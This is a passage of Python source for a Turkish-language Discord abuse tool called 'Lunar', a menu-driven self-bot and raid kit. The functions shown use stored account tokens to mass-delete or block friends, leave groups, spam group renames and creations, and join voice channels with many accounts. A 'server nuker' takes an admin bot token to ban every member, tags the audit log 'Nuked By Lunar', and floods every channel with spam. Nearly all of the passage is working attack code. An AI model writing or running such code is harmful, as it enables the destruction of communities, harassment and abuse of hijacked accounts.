    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens)
    if not selected_account: return
    try:
        print(f"\n{DANGER_RED}Seçilen Hesap: {WHITE}{selected_account['username']}{RESET}")
        confirm = custom_input("TÜM Arkadaşları silmek için 'evet':", color=Fore.RED).lower()
        if confirm != 'evet': print(f"\n{Fore.YELLOW}İşlem iptal edildi.{RESET}"); time.sleep(2); return
    except (KeyboardInterrupt, EOFError): return
    token = selected_account['token']
    try:
        response = safe_request('GET', "https://discord.com/api/v9/users/@me/relationships", token=token)
        if response.status_code == 200:
            friends = [r for r in response.json() if r['type'] == 1]
            if not friends: print(f"\n{Fore.GREEN}Silinecek arkadaş bulunamadı.{RESET}")
            else:
                print(f"\n{Fore.YELLOW}{len(friends)} arkadaş silinecek...{RESET}")
                for i, friend in enumerate(friends):
                    friend_user = friend['user']
                    friend_discriminator = friend_user.get('discriminator', '0')
                    friend_display = f"{friend_user['username']}#{friend_discriminator}" if friend_discriminator and friend_discriminator != '0' else friend_user['username']
                    print(f"{DIM_WHITE} › [{i+1}/{len(friends)}] Siliniyor: {friend_display}{RESET}")
                    safe_request('DELETE', f"https://discord.com/api/v9/users/@me/relationships/{friend_user['id']}", token=token); time.sleep(0.8)
                print(f"\n{Fore.GREEN}Tüm arkadaşlar başarıyla silindi.{RESET}")
        else: print(f"{DANGER_RED}HATA: Arkadaş listesi alınamadı.{RESET}")
    except requests.RequestException as e: print(f"{DANGER_RED}Ağ hatası: {e}{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def token_block_friends():
    set_title("Lunar /// Block Friends"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Arkadaş Engelleme <<< {RESET}")
    tokens = load_tokens();
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens)
    if not selected_account: return
    try:
        print(f"\n{DANGER_RED}Seçilen Hesap: {WHITE}{selected_account['username']}{RESET}")
        confirm = custom_input("TÜM Arkadaşları engellemek için 'evet':", color=Fore.RED).lower()
        if confirm != 'evet': print(f"\n{Fore.YELLOW}İşlem iptal edildi.{RESET}"); time.sleep(2); return
    except (KeyboardInterrupt, EOFError): return
    token = selected_account['token']
    try:
        response = safe_request('GET', "https://discord.com/api/v9/users/@me/relationships", token=token)
        if response.status_code == 200:
            friends = [r for r in response.json() if r['type'] == 1]
            if not friends: print(f"\n{Fore.GREEN}Engellenecek arkadaş bulunamadı.{RESET}")
            else:
                print(f"\n{Fore.YELLOW}{len(friends)} arkadaş engellenecek...{RESET}")
                for i, friend in enumerate(friends):
                    friend_user = friend['user']
                    friend_discriminator = friend_user.get('discriminator', '0')
                    friend_display = f"{friend_user['username']}#{friend_discriminator}" if friend_discriminator and friend_discriminator != '0' else friend_user['username']
                    print(f"{DIM_WHITE} › [{i+1}/{len(friends)}] Engelleniyor: {friend_display}{RESET}")
                    safe_request('PUT', f"https://discord.com/api/v9/users/@me/relationships/{friend_user['id']}", token=token, json={'type': 2}); time.sleep(0.8)
                print(f"\n{Fore.GREEN}Tüm arkadaşlar başarıyla engellendi.{RESET}")
        else: print(f"{DANGER_RED}HATA: Arkadaş listesi alınamadı.{RESET}")
    except requests.RequestException as e: print(f"{DANGER_RED}Ağ hatası: {e}{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def groupname_changer():
    set_title("Lunar /// Group Name Changer"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Grup Adı Değiştirici <<< {RESET}\n")
    tokens = load_tokens()
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens)
    if not selected_account: return
    try:
        group_id = custom_input("Grup ID'sini girin:")
        names_input = custom_input("Yeni adları virgülle girin:")
        names_list = [name.strip() for name in names_input.split(',') if name.strip()]
        if not names_list: print(f"\n{DANGER_RED}HATA: Geçerli bir isim girmediniz.{RESET}"); time.sleep(2); return
        delay = float(custom_input("İsim değiştirme sıklığı (sn):"))
    except (ValueError, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}Geçersiz giriş veya işlem iptali.{RESET}"); time.sleep(2); return
    token = selected_account['token']
    stop_event = threading.Event()
    def worker():
        last_successful_name = None
        while not stop_event.is_set():
            try:
                new_name = random.choice(names_list)
                while new_name == last_successful_name and len(names_list) > 1: new_name = random.choice(names_list)
                response = safe_request('PATCH', f"https://discord.com/api/v9/channels/{group_id}", token=token, json={'name': new_name})
                if response.status_code == 200:
                    print(f"{Fore.GREEN}Başarılı!{RESET} Grup adı: {WHITE}{new_name}{RESET}"); last_successful_name = new_name
                    time.sleep(delay)
                elif response.status_code == 429:
                    retry_after = response.json().get('retry_after', 1)
                    print(f"{Fore.YELLOW}Rate limit! {retry_after:.2f} saniye bekleniyor...{RESET}"); time.sleep(retry_after)
                else: print(f"{DANGER_RED}Kritik Hata: Status {response.status_code}. Durduruluyor.{RESET}"); break
            except requests.RequestException as e: print(f"{DANGER_RED}Ağ hatası: {e}. Durduruluyor.{RESET}"); break
    worker_thread = threading.Thread(target=worker, daemon=True); worker_thread.start()
    print(f"\n{Fore.YELLOW}İsim değiştirme döngüsü başlatıldı. Durdurmak için Enter'a basın...{RESET}")
    try: input()
    except (KeyboardInterrupt, EOFError): pass
    print(f"\n{DANGER_RED}İşlem durduruluyor...{RESET}"); stop_event.set(); time.sleep(1)
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def group_leaver():
    set_title("Lunar /// Group Leaver"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Gruplardan Ayrılma <<< {RESET}")
    tokens = load_tokens();
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens)
    if not selected_account: return
    try:
        print(f"\n{DANGER_RED}Seçilen Hesap: {WHITE}{selected_account['username']}{RESET}")
        confirm = custom_input("TÜM Gruplardan ayrılmak için 'evet':", color=Fore.RED).lower()
        if confirm != 'evet': print(f"\n{Fore.YELLOW}İşlem iptal edildi.{RESET}"); time.sleep(2); return
    except (KeyboardInterrupt, EOFError): return
    token = selected_account['token']
    try:
        response = safe_request('GET', "https://discord.com/api/v9/users/@me/channels", token=token)
        if response.status_code == 200:
            groups = [ch for ch in response.json() if ch['type'] == 3]
            if not groups: print(f"\n{Fore.GREEN}Ayrılacak grup bulunamadı.{RESET}")
            else:
                print(f"\n{Fore.YELLOW}{len(groups)} gruptan ayrılınacak...{RESET}")
                for i, group in enumerate(groups):
                    group_name = group.get('name') or "İsimsiz Grup"
                    print(f"{DIM_WHITE} › [{i+1}/{len(groups)}] Gruptan ayrılıyor: {group_name}{RESET}")
                    safe_request('DELETE', f"https://discord.com/api/v9/channels/{group['id']}", token=token); time.sleep(1.5)
                print(f"\n{Fore.GREEN}Tüm gruplardan başarıyla ayrılındı.{RESET}")
        else: print(f"{DANGER_RED}HATA: Gruplar alınamadı.{RESET}")
    except requests.RequestException as e: print(f"{DANGER_RED}Ağ hatası: {e}{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def group_creator():
    set_title("Lunar /// Group Creator"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Grup Oluşturucu <<< {RESET}\n")
    tokens = load_tokens()
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens, title="--- Grubu Oluşturacak Hesabı Seçin ---")
    if not selected_account: return
    try:
        target_id = custom_input("Birlikte grup kurulacak ID:")
        count = int(custom_input("Kaç adet grup oluşturulsun?:"))
    except (ValueError, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}Geçersiz giriş veya işlem iptali.{RESET}"); time.sleep(2); return
    token = selected_account['token']
    url = "https://discord.com/api/v9/users/@me/channels"
    payload = {'recipients': [target_id]}; print(f"\n{Fore.YELLOW}{count} adet grup oluşturuluyor...{RESET}")
    for i in range(count):
        try:
            res = safe_request('POST', url, token=token, json=payload)
            if res.status_code == 200: print(f"{Fore.GREEN}[{i+1}/{count}] Grup oluşturuldu.{RESET}")
            else: print(f"{DANGER_RED}[{i+1}/{count}] Hata: {res.status_code}{RESET}")
            time.sleep(1.2)
        except requests.RequestException: print(f"{DANGER_RED}[{i+1}/{count}] Ağ Hatası.{RESET}")
    print(f"\n{Fore.GREEN}Grup oluşturma işlemi tamamlandı.{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def server_nuker():
    set_title("Lunar /// Server Nuker"); clear_screen(); print(f"\n{DANGER_RED}>>> SERVER NUKER MODÜLÜ <<< {RESET}")
    print(f"{DANGER_RED}Bu modül, YÖNETİCİ yetkilerine sahip bir BOT TOKENİ ile çalışır.{RESET}\n")
    try:
        guild_id = custom_input("Hedef Sunucu ID'si:")
        bot_token = custom_input("Yönetici Yetkili Bot Token:")
        if not guild_id or not bot_token: return
    except (KeyboardInterrupt, EOFError): return
    base_url = "https://discord.com/api/v9"
    try:
        res = safe_request('GET', f"{base_url}/guilds/{guild_id}", token=bot_token, bot_token=True)
        if res.status_code != 200: print(f"\n{DANGER_RED}HATA: Sunucu/Bot Tokeni geçersiz. Status: {res.status_code}{RESET}"); input(f"\n{DIM_WHITE}Geri dönmek için Enter...{RESET}"); return
        guild_name = res.json()['name']
    except requests.RequestException: print(f"\n{DANGER_RED}HATA: Ağa bağlanılamadı.{RESET}"); input(f"\n{DIM_WHITE}Geri dönmek için Enter...{RESET}"); return
    stop_event = threading.Event()
    audit_headers = {'X-Audit-Log-Reason': 'Nuked By Lunar'}
    def ban_worker(member_id): safe_request('PUT', f"{base_url}/guilds/{guild_id}/bans/{member_id}", token=bot_token, bot_token=True, headers=audit_headers)
    def kick_worker(member_id): safe_request('DELETE', f"{base_url}/guilds/{guild_id}/members/{member_id}", token=bot_token, bot_token=True, headers=audit_headers)
    def delete_channel_worker(channel_id): safe_request('DELETE', f"{base_url}/channels/{channel_id}", token=bot_token, bot_token=True, headers=audit_headers)
    def delete_role_worker(role_id): safe_request('DELETE', f"{base_url}/guilds/{guild_id}/roles/{role_id}", token=bot_token, bot_token=True, headers=audit_headers)
    def spam_worker(channel_id, message):
        while not stop_event.is_set():
            safe_request('POST', f"{base_url}/channels/{channel_id}/messages", token=bot_token, bot_token=True, json={'content': message}); time.sleep(0.5)
    while True:
        clear_screen(); print(f"{DANGER_RED}>>> LUNAR SERVER NUKER /// {WHITE}{guild_name}{RESET} <<<{RESET}")
        print("-" * 60)
        print("[01] Herkesi Banla\t\t[02] Herkesi At\n[03] Kanalları Sil\t\t[04] Spam Kanal Oluştur\n[05] Rolleri Sil\t\t[06] Spam Rol Oluştur\n[07] Emojileri Sil\t\t[08] Mesaj Spamla (Sınırsız)")
        print("[00] Ana Menüye Dön"); print("-" * 60)
        choice = custom_input("Nuke Seçiminizi yapın:")
        if choice == "00": break
        with ThreadPoolExecutor(max_workers=100) as executor:
            try:
                if choice == "01":
                    members = safe_request('GET', f"{base_url}/guilds/{guild_id}/members?limit=1000", token=bot_token, bot_token=True).json(); bot_id = safe_request('GET', f"{base_url}/users/@me", token=bot_token, bot_token=True).json()['id']
                    ids = [m['user']['id'] for m in members if m['user']['id'] != bot_id]
                    executor.map(ban_worker, ids); print(f"{Fore.GREEN}{len(ids)} üyeye ban isteği gönderildi.{RESET}")
                elif choice == "08":
                    message = custom_input("Spamlanacak mesaj:")
                    channels = [c['id'] for c in safe_request('GET', f"{base_url}/guilds/{guild_id}/channels", token=bot_token, bot_token=True).json() if c['type'] == 0]
                    threads = [threading.Thread(target=spam_worker, args=(ch_id, message), daemon=True) for ch_id in channels]
                    for t in threads: t.start()
                    print(f"\n{Fore.YELLOW}{len(threads)} kanalda spam döngüsü başlatıldı. Durdurmak için Enter'a basın...{RESET}")
                    try: input()
                    except (KeyboardInterrupt, EOFError): pass
                    print(f"\n{DANGER_RED}İşlem durduruluyor...{RESET}"); stop_event.set(); time.sleep(1)
                else:
                    print(f"{DANGER_RED}Geçersiz veya henüz eklenmemiş seçenek.{RESET}")
            except Exception as e:
                print(f"{DANGER_RED}Bir hata oluştu: {e}{RESET}")
        input("\nİşlem(ler) için istekler gönderildi. Devam etmek için Enter'a basın...")

def voice_joiner():
    set_title("Lunar /// Voice Joiner"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Ses Kanalına Girme <<< {RESET}\n")
    print(f"{Fore.YELLOW}Bu özelliğin çalışması için 'discord.py' kütüphanesi gereklidir.{RESET}")
    print(f"{DIM_WHITE}Not: User token desteği sınırlı olabilir. Token'ın geçerli olduğundan emin olun.{RESET}\n")
    tokens = load_tokens();
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_accounts = select_multiple_accounts(tokens)
    if not selected_accounts: return
    try:
        print(f"\n{Fore.CYAN}--- Nereye Girilecek? ---{RESET}"); print(f"  {BRIGHT_WHITE}1{RESET} - Sunucu Ses Kanalı"); print(f"  {BRIGHT_WHITE}2{RESET} - DM Grup Araması")
        type_choice = custom_input("Seçiminiz:")
        guild_id, channel_id = None, None
        if type_choice == '1':
            guild_id = int(custom_input("Sunucu ID'si:"))
            channel_id = int(custom_input("Ses Kanalı ID'si:"))
        elif type_choice == '2':
            channel_id = int(custom_input("DM Grup Kanal ID'si:"))
        else: raise ValueError
        mute = custom_input("Kendini Sessize Al (e/h):").lower() == 'e'
        deaf = custom_input("Kendini Sağırlaştır (e/h):").lower() == 'e'
    except (ValueError, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}Geçersiz giriş.{RESET}"); time.sleep(2); return
    clients = []
    stop_clients = threading.Event()
    async def run_client(token):
        intents = discord.Intents.default()
        client = discord.Client(intents=intents)
        @client.event
        async def on_ready():
            print(f"{Fore.GREEN}Giriş yapıldı: {client.user} (Kullanıcı){RESET}")
            try:
                await asyncio.sleep(2)
                payload = {
                    'op': 4,
                    'd': {
                        'guild_id': str(guild_id) if guild_id else None,
                        'channel_id': str(channel_id) if channel_id else None,
                        'self_mute': mute,
                        'self_deaf': deaf
                    }
                }
                
                success = False
                if hasattr(client, '_connection') and client._connection:
                    if hasattr(client._connection, 'ws') and client._connection.ws:
                        ws = client._connection.ws
                        if hasattr(ws, 'open') and ws.open:
                            if hasattr(ws, 'send_as_json'):
                                await ws.send_as_json(payload)
                                success = True
                            elif hasattr(ws, 'send'):
                                await ws.send(json.dumps(payload))
                                success = True
                    elif hasattr(client._connection, '_websocket') and client._connection._websocket:
                        ws = client._connection._websocket
                        if hasattr(ws, 'send'):
                            await ws.send(json.dumps(payload))
                            success = True
                    elif hasattr(client._connection, 'send'):
                        await client._connection.send(payload)
                        success = True
                
                if not success and hasattr(client, 'ws') and client.ws:
                    if hasattr(client.ws, 'send'):
                        await client.ws.send(json.dumps(payload))
                        success = True
                
                if success:
                    print(f"{Fore.CYAN}{client.user} ses kanalına katıldı.{RESET}")
                else:
                    print(f"{DANGER_RED}{client.user} ses kanalına katılamadı - bağlantı bulunamadı.{RESET}")
                    print(f"{DIM_WHITE}Debug: _connection={hasattr(client, '_connection')}, ws={hasattr(client, 'ws')}{RESET}")
            except Exception as e: 
                print(f"{DANGER_RED}{client.user} katılamadı: {e}{RESET}")
                import traceback
                traceback.print_exc()
        @client.event
        async def on_disconnect():
            if not stop_clients.is_set():
                print(f"{Fore.YELLOW}{client.user} bağlantısı kesildi.{RESET}")
        clients.append(client)
        try:
            clean_token = token.strip()
            if clean_token.startswith('Bot '):
                clean_token = clean_token[4:]
            elif clean_token.startswith('bot '):
                clean_token = clean_token[4:]
            
            test_response = safe_request('GET', "https://discord.com/api/v9/users/@me", token=clean_token)
            if test_response.status_code != 200:
                print(f"{DANGER_RED}Token Doğrulama Hatası (Token: ...{clean_token[-4:]}): Status {test_response.status_code}{RESET}")
                try:
                    if not client.is_closed():
                        await client.close()
                except: pass
                return
            
            try:
                await client.login(clean_token, bot=False)
            except TypeError:
                await client.login(clean_token)
            await client.connect()
        except discord.LoginFailure as e:
            print(f"{DANGER_RED}Giriş Hatası (Token: ...{token[-4:]}): {e}{RESET}")
            print(f"{DIM_WHITE}Not: Discord.py user token desteği sınırlı olabilir. Token'ın geçerli olduğundan emin olun.{RESET}")
            try:
                if not client.is_closed():
                    await client.close()
            except: pass
        except Exception as e:
            print(f"{DANGER_RED}Bilinmeyen Hata ({token[-4:]}): {e}{RESET}")
            try:
                if not client.is_closed():
                    await client.close()
            except: pass
    async def main_async_loop():
        tasks = []
        for acc in selected_accounts:
            task = asyncio.create_task(run_client(acc['token']))
            tasks.append(task)
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            print(f"{DANGER_RED}Hata: {e}{RESET}")
        finally:
            for client in clients:
                try:
                    if not client.is_closed():
                        await client.close()
                except: pass
    def run_loop_in_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(main_async_loop())
        except Exception as e:
            print(f"{DANGER_RED}Loop hatası: {e}{RESET}")
        finally:
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            try:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
            except: pass
            loop.close()
    loop_thread = threading.Thread(target=run_loop_in_thread, daemon=True); loop_thread.start(); time.sleep(3)
    print(f"\n{Fore.YELLOW}Token'lar ses kanalına bağlanıyor... Çıkmak için Enter'a basın.{RESET}")
    try: input()
    except (KeyboardInterrupt, EOFError): pass
    print(f"\n{DANGER_RED}İşlem durduruluyor, token'lar sesten çıkarılıyor...{RESET}")
    stop_clients.set()
    
    async def disconnect_client(client):
        try:
            if client.is_ready() and hasattr(client, '_connection') and client._connection:
                payload = {
                    'op': 4,
                    'd': {
                        'guild_id': str(guild_id) if guild_id is not None else None,
                        'channel_id': None,
                        'self_mute': False,
                        'self_deaf': False
                    }
                }
                
                ws = None
                if hasattr(client._connection, 'ws') and client._connection.ws:
                    ws = client._connection.ws
                elif hasattr(client._connection, '_websocket') and client._connection._websocket:
                    ws = client._connection._websocket
                elif hasattr(client, 'ws') and client.ws:
                    ws = client.ws
                
                if ws:
                    ws_open = (hasattr(ws, 'open') and ws.open) or (hasattr(ws, '_open') and getattr(ws, '_open', False))
                    if ws_open:
                        if hasattr(ws, 'send_as_json'):
                            await ws.send_as_json(payload)
                        elif hasattr(ws, 'send'):
                            await ws.send(json.dumps(payload))
                        print(f"{Fore.YELLOW}{client.user} sesten çıkarıldı.{RESET}")
            
            if not client.is_closed():
                await client.close()
        except Exception as e:
            user_name = client.user if hasattr(client, 'user') and client.user else 'Client'
            print(f"{DIM_WHITE}{user_name} çıkış hatası: {e}{RESET}")
    
    for client in clients:
        try:
            if hasattr(client, 'loop') and client.loop and not client.loop.is_closed():
                asyncio.run_coroutine_threadsafe(disconnect_client(client), client.loop)
            else:
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(disconnect_client(client))
                    loop.close()
                except: pass
        except Exception as e:
            print(f"{DIM_WHITE}Client disconnect hatası: {e}{RESET}")
    
    time.sleep(3)
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def exit_program():
    clear_screen()
    width = get_terminal_width()
    print("\n\n"); print(center_text(f"{Fore.GREEN}Programdan çıkılıyor... Hoşça kalın!{RESET}", width)); time.sleep(1)

def main():
    menu_map = {
        '1': message_spammer, '2': webhook_spammer, '3': webhook_deleter, '4': webhook_info,
        '5': token_onliner, '6': token_info, '7': token_dm_deleter, '8': token_delete_friends,
        '9': token_block_friends, '10': groupname_changer, '11': group_leaver, '12': group_creator,
        '13': server_nuker, '14': voice_joiner, '0': exit_program, '00': exit_program
    }
    global current_input_text
    run_startup_sequence()
    
    while True:
        clear_screen(); stop_animation.clear(); set_title("Lunar /// Ready")
        current_input_text = ""
        animation_thread = threading.Thread(target=animate_menu, daemon=True)
        animation_thread.start()
        
        while True:
            if msvcrt.kbhit():
                ch = msvcrt.getch()
                if ch == b'\r':
                    break
                elif ch == b'\x08':
                    if len(current_input_text) > 0:
                        current_input_text = current_input_text[:-1]
                elif ch in [b'\x00', b'\xe0']:
                    msvcrt.getch()
                else:
                    try:
                        char_str = ch.decode('utf-8')
                        if char_str.isprintable():
                            current_input_text += char_str
                    except: pass
            time.sleep(0.05)
            
        stop_animation.set()
        animation_thread.join()
        
        choice = current_input_text.strip()
        function_to_run = menu_map.get(choice)
        
        if function_to_run:
            function_to_run()
            if function_to_run == exit_program: break
        else:
            time.sleep(0.1)
            pass

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        clear_screen()
        print(center_text(f"\n{Fore.GREEN}Programdan çıkış yapıldı.{RESET}", 90))
